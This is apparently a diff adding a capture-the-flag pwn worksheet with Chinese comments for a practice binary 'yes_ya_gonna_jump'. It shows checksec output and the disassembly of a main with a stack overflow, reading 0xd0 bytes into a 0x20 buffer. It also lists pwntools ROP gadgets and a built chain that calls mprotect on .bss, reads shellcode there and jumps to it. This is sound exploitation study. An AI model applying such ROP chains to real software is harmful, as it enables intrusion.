@@ -1,0 +1,97 @@
+=== checksec ===
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+
+=== 這支二進位是 statically linked，symbol table 裡幾乎全是 libc 內部函式 ===
+=== 只挑出題目自己的 main，以及之後 ROP 會用到的 libc 函式位址 ===
+main 0x4017b5
+read 0x44f2e0
+mprotect 0x450020
+printf 0x40b6e0
+puts 0x4122b0
+.bss 起點（No PIE，位址固定）: 0x4c72a0
+
+--- main @ 0x4017b5 ---
+0x4017b5: endbr64 
+0x4017b9: push rbp
+0x4017ba: mov rbp, rsp
+0x4017bd: sub rsp, 0x20
+0x4017c1: mov qword ptr [rbp - 0x20], 0
+0x4017c9: mov qword ptr [rbp - 0x18], 0
+0x4017d1: mov qword ptr [rbp - 0x10], 0
+0x4017d9: mov qword ptr [rbp - 8], 0
+0x4017e1: mov rax, qword ptr [rip + 0xc3f08]
+0x4017e8: mov esi, 0
+0x4017ed: mov rdi, rax
+0x4017f0: call 0x4143b0
+0x4017f5: lea rax, [rip + 0x9680c]
+0x4017fc: mov rdi, rax
+0x4017ff: call 0x4122b0
+0x401804: lea rax, [rip + 0x9683d]
+0x40180b: mov rdi, rax
+0x40180e: call 0x4122b0
+0x401813: lea rax, [rip + 0x96866]
+0x40181a: mov rdi, rax
+0x40181d: call 0x4122b0
+0x401822: lea rax, [rip + 0x9688f]
+0x401829: mov rdi, rax
+0x40182c: call 0x4122b0
+0x401831: lea rax, [rip + 0x968a8]
+0x401838: mov rdi, rax
+0x40183b: call 0x4122b0
+0x401840: lea rax, [rbp - 0x20]
+0x401844: mov edx, 0xd0
+0x401849: mov rsi, rax
+0x40184c: mov edi, 0
+0x401851: call 0x44f2e0
+0x401856: lea rax, [rbp - 0x20]
+0x40185a: mov rsi, rax
+0x40185d: lea rax, [rip + 0x968a4]
+0x401864: mov rdi, rax
+0x401867: mov eax, 0
+0x40186c: call 0x40b6e0
+0x401871: mov eax, 0
+0x401876: leave 
+0x401877: ret 
+
+=== 字串 ===
+banner1 0x498008 -> b'Yes, ya gonna jump, yes, ya gonna jump \xe7\xaa\x81\xe3\x81\x8d\xe6\x8a\x9c\xe3\x81\x91\xe3\x81\xa6\xe3\x81\x8f~'
+banner2 0x498048 -> b'Let me be the one, let me be the one, Yes \xe5\x85\xab\xe8\x8a\x92\xe6\x98\x9f\xe3\x81\xb8'
+banner3 0x498080 -> b'Yes, ya gonna jump, yes, ya gonna jump \xe7\xac\x91\xe3\x81\x84 \xe5\x8f\xab\xe3\x81\xb6'
+banner4 0x4980b8 -> b'\xe6\x9c\xac\xe5\xbd\x93\xe3\x81\xae life \xe3\x81\xaa\xe3\x82\x93\xe3\x81\x96\xe5\xbf\x98\xe3\x82\x8c\xe3\x81\xa6'
+banner5 0x4980e0 -> b'Sing out \xe5\x85\xab\xe8\x8a\x92\xe6\x98\x9f\xe3\x83\x80\xe3\x83\xb3\xe3\x82\xb9 with me: '
+printf_fmt 0x498108 -> b'You sang:%sIs this the correct song?\n'
+
+=== 可用的 ROP gadgets（pwntools ROP 自動找出來的） ===
+[*] Loading gadgets for 'C:\\Users\\yanch\\Documents\\CTF\\project1\\yes_ya_gonna_jump\\yes_ya_gonna_jump'
+pop rdi; ret  -> Gadget(0x401f1f, ['pop rdi', 'ret'], ['rdi'], 0x10)
+pop rsi; ret  -> Gadget(0x409f8e, ['pop rsi', 'ret'], ['rsi'], 0x10)
+pop rax; ret  -> Gadget(0x44fd47, ['pop rax', 'ret'], ['rax'], 0x10)
+syscall       -> Gadget(0x401cd4, ['syscall'], [], 0x0)
+
+=== 組出來的 ROP chain：mprotect(bss,0x2000,7) -> read(0,bss,0x100) -> jmp bss ===
+[*] Loaded 124 cached gadgets for 'yes_ya_gonna_jump'
+page addr: 0x4c7000
+chain length: 136
+0x0000:         0x485b2b pop rdx; pop rbx; ret
+0x0008:              0x7 [arg2] rdx = 7
+0x0010:      b'eaaafaaa' <pad rbx>
+0x0018:         0x409f8e pop rsi; ret
+0x0020:           0x2000 [arg1] rsi = 8192
+0x0028:         0x401f1f pop rdi; ret
+0x0030:         0x4c7000 [arg0] rdi = 5009408
+0x0038:         0x450020 mprotect
+0x0040:         0x485b2b pop rdx; pop rbx; ret
+0x0048:            0x100 [arg2] rdx = 256
+0x0050:      b'uaaavaaa' <pad rbx>
+0x0058:         0x409f8e pop rsi; ret
+0x0060:         0x4c7000 [arg1] rsi = 5009408
+0x0068:         0x401f1f pop rdi; ret
+0x0070:              0x0 [arg0] rdi = 0
+0x0078:         0x44f2e0 read
+0x0080:         0x4c7000
